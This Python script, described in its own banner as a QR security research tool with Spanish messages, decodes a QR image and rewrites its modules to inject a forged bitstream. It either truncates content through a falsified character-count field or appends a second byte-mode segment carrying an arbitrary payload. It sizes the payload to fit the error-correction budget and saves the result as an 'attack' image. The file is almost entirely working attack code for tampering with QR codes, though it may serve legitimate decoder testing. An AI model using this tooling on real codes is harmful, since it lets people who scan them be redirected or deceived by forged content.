from bitstring import BitArray
import zxingcpp
import qrcode
import numpy as np
from PIL import Image
import os

def read_qr_with_metadata(image_path: str):
    if not os.path.isfile(image_path):
        print("[!] no image could be loaded")
        return None
    img = Image.open(image_path).convert('L')
    img_array = np.array(img)
    results = zxingcpp.read_barcodes(img_array)
    json = {}
    for res in results:
        for item in dir(res):
            if item.startswith("_"):
                continue
            
            json[item] = getattr(res,item)
    return json
def get_error_budget(version, ecl):
    
    
    qr_stats = {
        1: {'L': (26, 19), 'M': (26, 16), 'Q': (26, 13), 'H': (26, 9)},
        2: {'L': (44, 34), 'M': (44, 28), 'Q': (44, 22), 'H': (44, 16)},
        3: {'L': (70, 55), 'M': (70, 44), 'Q': (70, 34), 'H': (70, 26)}
    }
    
    qr_data = qr_stats.get(version, (26, 9))
    print(qr_data,ecl)
    total, data_cap = qr_data if isinstance(qr_data,tuple) else qr_data[ecl]
    error_capacity = total - data_cap
    
    budget_bytes = error_capacity // 2
    return budget_bytes, data_cap


def build_underflow_stream(MODE_BYTE,CCI_LENGTH,truncate_at,data):
    bitstream = BitArray()
    print(f"[*] Aplicando Underflow: Truncando a {truncate_at} caracteres.")
    bitstream.append(MODE_BYTE)
    
    bitstream.append(BitArray(uint=truncate_at, length=CCI_LENGTH))
    bitstream.append(BitArray(bytes=data.encode('utf-8')))
    return bitstream

def build_malicious_bitstream_with_budget(data, payload, attack_type, version=1, ecl='H',MODE_BYTE='0100'):
    
    budget, data_cap = get_error_budget(version, ecl)
    print(f"\n[i] Anaisis de presupuesto (Versión {version}-{ecl}):")
    print(f"    - Capacidad de datos: {data_cap} bytes")
    print(f"    - Presupuesto de corrección: {budget} bytes (máx. cambios permitidos)")
    
    bitstream = BitArray()
    CCI_LEN = 8

    if attack_type == '2': 
        total_attack_len = len(data) + len(payload) + 2 
        
        
        if len(payload) > budget:
            print(f"[!] ALERTA: El payload ({len(payload)}b) excede el presupuesto ({budget}b).")
            print("    El lector probablemente marcará el código como CORRUPTO.")
        else:
            print(f"[+] Payload dentro del presupuesto. El Reed-Solomon debería absorber el cambio.")

        
        bitstream.append(MODE_BYTE)
        bitstream.append(BitArray(uint=len(data), length=CCI_LEN))
        bitstream.append(BitArray(bytes=data.encode('utf-8')))
        
        
        bitstream.append(MODE_BYTE)
        bitstream.append(BitArray(uint=len(payload), length=CCI_LEN))
        bitstream.append(BitArray(bytes=payload.encode('utf-8')))
    
    return bitstream
def find_minimum_version_for_attack(payload_len, ecl_target='H'):

    
    qr_table = {
        1: {'L': (26, 19), 'M': (26, 16), 'Q': (26, 13), 'H': (26, 9)},
        2: {'L': (44, 34), 'M': (44, 28), 'Q': (44, 22), 'H': (44, 16)},
        3: {'L': (70, 55), 'M': (70, 44), 'Q': (70, 34), 'H': (70, 26)},
        4: {'L': (100, 80), 'M': (100, 64), 'Q': (100, 48), 'H': (100, 36)},
        5: {'L': (134, 108), 'M': (134, 86), 'Q': (134, 62), 'H': (134, 46)},
    }

    print(f"\n[?] Buscando versión compatible para un payload de {payload_len} bytes...")
    
    for version, levels in qr_table.items():
        total, data_cap = levels[ecl_target]
        
        budget = (total - data_cap) // 2
        
        if payload_len <= budget:
            return version, budget
            
    return None, 0
def calculate_desired_ecl(payload):
    
    
    
    payload_bytes = len(payload.encode('utf-8'))
    
    required_budget = payload_bytes + 2 
    ecl_deseado = 'H' 
    ver_min, max_budget = find_minimum_version_for_attack(required_budget,ecl_deseado)
    if ver_min:
        print(f"[+] VIABLE: Necesitas un QR Versión {ver_min} con Nivel {ecl_deseado}.")
        print(f"    Presupuesto total en esa versión: {max_budget} bytes.")
        print(f"    Tu ataque ocupa: {required_budget} bytes.")
    else:
        print("[-] NO VIABLE: El payload es demasiado grande para las versiones iniciales.")
        print("    Considera reducir el payload o usar Structured Append (máx 16 QRs).")
    return ver_min, max_budget,ecl_deseado

def build_malicious_bitstream_mixed_mode(data, attack_type,ecl,truncate_at=None):

    
    
    MODE_BYTE = '0b0100'
    CCI_LENGTH = 8 
    bitstream = None
    if attack_type == '1': 
        truncate_at = int(input('trunc position:'))
        bitstream = build_underflow_stream(MODE_BYTE,CCI_LENGTH,truncate_at,data)
        
    elif attack_type == '2': 
        payload = input("[!] payload:")
        inp2 = input("[?] calcular estimacion de ecl ideal ?")
        if not inp2 == 'y':
            bitstream = build_malicious_bitstream_with_budget(data,payload,attack_type='2',version=1,ecl=ecl,MODE_BYTE=MODE_BYTE)
        ver_min,max_budget,eecl = calculate_desired_ecl(payload)
        inp = input('[?] usar ecl estimado ?: (y/n)')
        bitstream = None
        if inp.lower() == 'y':
            bitstream = build_malicious_bitstream_with_budget(data,payload,attack_type='2',version=ver_min,ecl=eecl,MODE_BYTE=MODE_BYTE)
        else:
            bitstream = build_malicious_bitstream_with_budget(data,payload,attack_type='2',version=1,ecl=ecl,MODE_BYTE=MODE_BYTE)
        
    if bitstream ==  None:
        raise ValueError('[!] Error making the stream data!')
    return bitstream

def get_ecl_name(level):
    levels = {
         "L":"7%",
         "M":"15%",
         "Q":"25%",
         "H":"30%"
    }
    return levels.get(level, "Desconocido")


def inject_bitstream_to_pixels(base_qr_path, mal_bitstream,version,output_path="attack_final.png"):
    
    img = Image.open(base_qr_path).convert('1')
    width, height = img.size
    
    
    pixels = np.array(img).astype(int)
    
    
    
    box_size = 1
    for test_size in range(1, 50):
        
        if test_size < width and test_size < height:
            if pixels[test_size, test_size] != pixels[test_size + 1, test_size + 1]:
                box_size = test_size
                break
    
    
    if box_size == 1:
        box_size = max(1, min(width, height) // 40)  
    
    
    qr_size_modules = width // box_size
    
    
    reserved = np.zeros((qr_size_modules, qr_size_modules), dtype=bool)
    
    
    def mark_finder_pattern(r, c):
        
        for i in range(7):
            for j in range(7):
                if 0 <= r + i < qr_size_modules and 0 <= c + j < qr_size_modules:
                    reserved[r + i, c + j] = True
        
        for i in range(8):
            if 0 <= r + 7 < qr_size_modules and 0 <= c + i < qr_size_modules:
                reserved[r + 7, c + i] = True
            if 0 <= r + i < qr_size_modules and 0 <= c + 7 < qr_size_modules:
                reserved[r + i, c + 7] = True
    
    
    mark_finder_pattern(0, 0)  
    mark_finder_pattern(0, qr_size_modules - 7)  
    mark_finder_pattern(qr_size_modules - 7, 0)  
    
    
    for i in range(8, qr_size_modules - 8):
        reserved[6, i] = True  
        reserved[i, 6] = True  
    
    
    
    for i in range(9):
        reserved[8, i] = True  
        reserved[i, 8] = True  
        reserved[8, qr_size_modules - i - 1] = True  
        reserved[qr_size_modules - i - 1, 8] = True  
    
    
    if version >= 1:
        reserved[4 * version + 9, 8] = True
    
    
    
    alignment_positions = {
        2: [6, 18], 3: [6, 22], 4: [6, 26], 5: [6, 30, 34],
        6: [6, 30, 54], 7: [6, 22, 38, 54], 8: [6, 24, 42, 60],
        9: [6, 24, 42, 60], 10: [6, 28, 50, 72]
    }
    
    
    if 2 <= version <= 10 and version in alignment_positions:
        for row in alignment_positions[version]:
            for col in alignment_positions[version]:
                if row != 6 or col != 6:  
                    for dy in range(-2, 3):
                        for dx in range(-2, 3):
                            r, c = row + dy, col + dx
                            if 0 <= r < qr_size_modules and 0 <= c < qr_size_modules:
                                reserved[r, c] = True
    
    
    
    current_bit = 0
    mal_bits = mal_bitstream.bin  
    
    col = qr_size_modules - 1
    direction_up = True  
    
    while col > 6:  
        
        for col_offset in [0, -1]:
            current_col = col + col_offset
            
            if direction_up:
                for row in range(qr_size_modules - 1, -1, -1):
                    if not reserved[row, current_col]:
                        if current_bit < len(mal_bits):
                            
                            bit_value = 0 if mal_bits[current_bit] == '1' else 1
                            
                            
                            pixel_row = row * box_size + box_size // 2
                            pixel_col = current_col * box_size + box_size // 2
                            
                            if pixel_row < height and pixel_col < width:
                                pixels[pixel_row, pixel_col] = bit_value
                            
                            current_bit += 1
            else:
                for row in range(qr_size_modules):
                    if not reserved[row, current_col]:
                        if current_bit < len(mal_bits):
                            bit_value = 0 if mal_bits[current_bit] == '1' else 1
                            
                            pixel_row = row * box_size + box_size // 2
                            pixel_col = current_col * box_size + box_size // 2
                            
                            if pixel_row < height and pixel_col < width:
                                pixels[pixel_row, pixel_col] = bit_value
                            
                            current_bit += 1
        
        
        direction_up = not direction_up
        col -= 2
    
    
    new_img = Image.fromarray((pixels * 255).astype(np.uint8))
    new_img.save(output_path)
    
    print(f"[+] Ataque inyectado físicamente en {output_path}")
    print(f"    [i] Tamaño del módulo detectado: {box_size}px")
    print(f"    [i] Versión QR estimada: {version} ({qr_size_modules}x{qr_size_modules} módulos)")
    print(f"    [i] Bits inyectados: {min(current_bit, len(mal_bits))}/{len(mal_bits)}")

def simulate_qr_attack():
    print("--- QR Security Research Tool: CCI & Mixed Mode Manipulation ---")
    
    img_path = input("Introduce la ruta de la imagen QR original: ")
    metadata = read_qr_with_metadata(img_path)
    print(metadata)
    
    if not metadata or not metadata['text']:
        print(metadata)
        print("[!] Error: No se pudo decodificar el QR original.")
        return

    original_data = metadata['text']
    ecl_detected = metadata['ec_level']
    print(f"[+] Datos detectados: {original_data}")
    print(f"[+] Nivel de error: {ecl_detected}")
    prob = get_ecl_name(ecl_detected)
    print(f"[!] Probabilidad de realziacion del ataque: {prob}")
    inp = input("Continuar con el ataque (y/n)")
    print(f"[!] DISCLAMER: es posible que se deba de recalcular Reed-solomon para que el payload funcione en algunos casos")

    if not inp.lower() == 'y':
        return
    print("\nModos de Ataque:")
    print("1. Buffer Underflow (Truncado por manipulación de CCI)")
    print("2. Buffer Overflow (Inyección mediante Mixed Modes)")
    choice = input("Selecciona el modo (1/2): ")

    bitstream = build_malicious_bitstream_mixed_mode(data=original_data,attack_type=choice,ecl=ecl_detected)
    
    inject_bitstream_to_pixels(base_qr_path=img_path,mal_bitstream=bitstream,version=int(metadata['extra']['Version']))


    
    
    

if __name__ == "__main__":
    simulate_qr_attack()
